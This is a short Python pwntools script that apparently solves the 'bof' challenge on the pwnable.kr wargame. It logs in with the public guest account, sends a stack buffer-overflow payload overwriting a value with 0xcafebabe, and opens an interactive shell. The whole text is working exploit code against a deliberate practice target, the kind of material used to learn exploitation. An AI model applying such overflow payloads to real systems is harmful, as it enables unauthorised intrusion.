from pwn import *

s = ssh(
  user='bof',
  host='pwnable.kr',
  port=2222,
  password='guest'
)

rem = s.process(['nc', '0', '9000'])

rem.sendline(b"A" * 0x34 + p32(0xcafebabe))
rem.interactive()